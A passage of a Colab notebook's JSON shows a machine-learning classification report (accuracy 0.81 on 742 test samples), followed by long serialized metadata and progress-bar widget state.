pred)"]},{"cell_type":"code","execution_count":null,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":2,"status":"ok","timestamp":1680792097088,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"ZGvG-5zAQtAy","outputId":"ce801c21-2046-4ec3-ca97-e58d20d8e59a"},"outputs":[{"name":"stdout","output_type":"stream","text":["              precision    recall  f1-score   support\n","\n","           0       0.85      0.85      0.85       317\n","           1       0.88      0.69      0.77       147\n","           2       0.67      0.84      0.74       146\n","           3       0.85      0.81      0.83       112\n","           4       0.95      0.95      0.95        20\n","\n","    accuracy                           0.81       742\n","   macro avg       0.84      0.83      0.83       742\n","weighted avg       0.82      0.81      0.81       742\n","\n"]}],"source":["print(classification_report(y_test, pred))"]},{"cell_type":"code","execution_count":null,"metadata":{"id":"0i-XSn_MohEp"},"outputs":[],"source":[]}],"metadata":{"accelerator":"GPU","colab":{"name":"","version":""},"gpuClass":"standard","kernelspec":{"display_name":"Python 3","language":"python","name":"python3"},"language_info":{"codemirror_mode":{"name":"ipython","version":3},"file_extension":".py","mimetype":"text/x-python","name":"python","nbconvert_exporter":"python","pygments_lexer":"ipython3","version":"3.8.8"},"widgets":{"application/vnd.jupyter.widget-state+json":{"12d8bbc2d148449998f48ff25cc41126":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"1bcea65195884dda97b638de6b0c9044":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HBoxModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HBoxModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HBoxView","box_style":"","children":["IPY_MODEL_263d771f06e0430ba752b7d6535e8c14","IPY_MODEL_ffc08eb6b703410391267167955036c4","IPY_MODEL_4b15ad7af4e64e50aac8c703ba90ab64"],"layout":"IPY_MODEL_c32b3ff25aec448193a296aa3d747a14"}},"200e4f8be22344a6b7e77dd8d9ee5213":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"20f437263e944bfcb3848368c082437a":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"DescriptionStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"DescriptionStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","description_width":""}},"21388d65f4d84cb9bd99ce9ba5eca2ec":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HBoxModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HBoxModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HBoxView","box_style":"","children":["IPY_MODEL_6bdb7e9072904ea3b296c3d5af3993e1","IPY_MODEL_37c2f9a42a5b4b8b97816db0dd9c667f","IPY_MODEL_f1230ab56c25452f86dee73ff84f9612"],"layout":"IPY_MODEL_b0941ef8a76d4752b74dbd71040185e1"}},"228eece9bb7444c59d958dba2e3f65db":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"263d771f06e0430ba752b7d6535e8c14":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HTMLModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HTMLModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HTMLView","description":"","description_tooltip":null,"layout":"IPY_MODEL_77eebe73f13541758d4e14c2b742f3d7","placeholder":"​","style":"IPY_MODEL_20f437263e944bfcb3848368c082437a","value":" 32%"}},"37c2f9a42a5b4b8b97816db0dd9c667f":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"FloatProgressModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"FloatProgressModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"ProgressView","bar_style":"success","description":"","description_tooltip":null,"layout":"IPY_MODEL_b2ca95180aca45b394f610563c3f3e15","max":371,"min":0,"orientation":"horizontal","style":"IPY_MODEL_ad60154d606c4673bd1bf4c0ded7d74d","value":371}},"3903d4f2dae74329aa4853e055a51750":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"ProgressStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"ProgressStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","bar_color":null,"description_width":""}},"3c0139844406476fa99d87db654c76cf":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HTMLModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HTMLModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HTMLView","description":"","description_tooltip":null,"layout":"IPY_MODEL_228eece9bb7444c59d958dba2e3f65db","placeholder":"​","style":"IPY_MODEL_9b339a77b8d94d858ade2e8cd40e7fe3","value":" 371/371 [04:53\u0026lt;00:00,  1.47it/s]"}},"3d33f6677ae84a6aaeee92cac56203e4":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"DescriptionStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"DescriptionStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","description_width":""}},"42397096967141da8ebdabbea10448e1":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"DescriptionStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"DescriptionStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","description_width":""}},"42ccf4ed7fb44d15b7e2daf03a6147d3":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HBoxModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HBoxModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HBoxView","box_style":"","children":["IPY_MODEL_531bb0349c914b25b2fba96c79fa458b","IPY_MODEL_f317baf73d664b878ea986af061d798f","IPY_MODEL_99cbcc226d14403a9806925408cc5005"],"layout":"IPY_MODEL_76fd29c116bb4b9d8c7407f4869b9b58"}},"43a78077f83a48f1b1feb2c916bd0064":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HTMLModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HTMLModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HTMLView","description":"","description_tooltip":null,"layout":"IPY_MODEL_200e4f8be22344a6b7e77dd8d9ee5213","placeholder":"​","style":"IPY_MODEL_cc02bffff8434a33a7378d8c0e5fc170","value":"100%"}},"4b15ad7af4e64e50aac8c703ba90ab64":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HTMLModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HTMLModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HTMLView","description":"","description_tooltip":null,"layout":"IPY_MODEL_952f3e9caa5f4279aee125ae02c85515","placeholder":"​","style":"IPY_MODEL_3d33f6677ae84a6aaeee92cac56203e4","value":" 117/371 [01:32\u0026lt;03:21,  1.26it/s]"}},"520a5106134945518d40274fa1623398":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"ProgressStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"ProgressStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","bar_color":null,"description_width":""}},"531bb0349c914b25b2fba96c79fa458b":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HTMLModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HTMLModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HTMLView","description":"","description_tooltip":null,"layout":"IPY_MODEL_ecaffe1539cd40359c1ff5b0b125f48a","placeholder":"​","style":"IPY_MODEL_7ecab803848d428db99e91618bc7d154","value":"100%"}},"590efda570b6431a8a58b8cc7055b5b9":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"FloatProgressModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"FloatProgressModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"ProgressView","bar_style":"success","description":"","description_tooltip":null,"layout":"IPY_MODEL_c291b5527e8c46a3850b0d91a4e8a10c","max":371,"min":0,"orientation":"horizontal","style":"IPY_MODEL_520a5106134945518d40274fa1623398","value":371}},"60b85dd3f8e84c9582a38176d3f1fa56":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"66be3d2de49f43aba2a9e79c1964957d":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"67c386c6d2c94fa9bdde8423db03cbf7":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"699dd5f8d1544c208b26bcfbdcb8cf6b":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"ProgressStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"ProgressStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","bar_color":null,"description_width":""}},"6bdb7e9072904ea3b296c3d5af3993e1":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HTMLModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HTMLModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HTMLView","description":"","description_tooltip":null,"layout":"IPY_MODEL_66be3d2de49f43aba2a9e79c1964957d","placeholder":"​","style":"IPY_MODEL_c328b2fa264947ea8fce2a95e37356d2","value":"100%"}},"7136f6817dc44a2db2288f6d96558f23":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HTMLModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HTMLModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HTMLView","description":"","description_tooltip":null,"layout":"IPY_MODEL_ec764cc3127c492e9b74ddf0e62db416","placeholder":"​","style":"IPY_MODEL_e89eb4243dd14110bc5124e8d97bfae3","value":" 371/371 [04:54\u0026lt;00:00,  1.46it/s]"}},"76fd29c116bb4b9d8c7407f4869b9b58":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"77eebe73f13541758d4e14c2b742f3d7":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"7ecab803848d428db99e91618bc7d154":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"DescriptionStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"DescriptionStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","description_width":""}},"81f638d57db845bfaab0d2617be27645":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HBoxModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HBoxModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HBoxView","box_style":"","children":["IPY_MODEL_43a78077f83a48f1b1feb2c916bd0064","IPY_MODEL_f8b18681defa423a9889c3e6df3addfa","IPY_MODEL_7136f6817dc44a2db2288f6d96558f23"],"layout":"IPY_MODEL_a6b21c74401f41ddab657903f870a3f8"}},"8c941746b74048afb97ac23b1efa120c":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"ProgressStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"ProgressStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","bar_color":null,"description_width":""}},"952f3e9caa5f4279aee125ae02c85515":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"99cbcc226d14403a9806925408cc5005":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HTMLModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HTMLModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HTMLView","description":"","description_tooltip":null,"layout":"IPY_MODEL_67c386c6d2c94fa9bdde8423db03cbf7","placeholder":"​","style":"IPY_MODEL_ed87fe5043b144a181f175433aa7f83a","value":" 93/93 [00:25\u0026lt;00:00,  3.93it/s]"}},"9b339a77b8d94d858ade2e8cd40e7fe3":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"DescriptionStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"DescriptionStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","description_width":""}},"a6b21c74401f41ddab657903f870a3f8":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"a8491ea276e644688d968354ae331691":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"a9b465120af04e128f2af25aa57d6e3a":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HBoxModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HBoxModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HBoxView","box_style":"","children":["IPY_MODEL_c1643b986eba43cc933a2b1a4955bdd6","IPY_MODEL_590efda570b6431a8a58b8cc7055b5b9","IPY_MODEL_3c0139844406476fa99d87db654c76cf"],"layout":"IPY_MODEL_60b85dd3f8e84c9582a38176d3f1fa56"}},"ad60154d606c4673bd1bf4c0ded7d74d":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"ProgressStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"ProgressStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","bar_color":null,"description_width":""}},"b0941ef8a76d4752b74dbd71040185e1":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"b2ca95180aca45b394f610563c3f3e15":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"b618512822ac48a8b8be1fafb1a08b87":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"c1643b986eba43cc933a2b1a4955bdd6":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HTMLModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HTMLModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HTMLView","description":"","description_tooltip":null,"layout":"IPY_MODEL_db033ecb31b4491c824d4092ad656d82","placeholder":"​","style":"IPY_MODEL_d1e34ae84d3e4f01b10eb18a383546c8","value":"100%"}},"c291b5527e8c46a3850b0d91a4e8a10c":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"c328b2fa264947ea8fce2a95e37356d2":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"DescriptionStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"DescriptionStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","description_width":""}},"c32b3ff25aec448193a296aa3d747a14":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"c7645c2860b048b2afb81883bbab1c47":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":n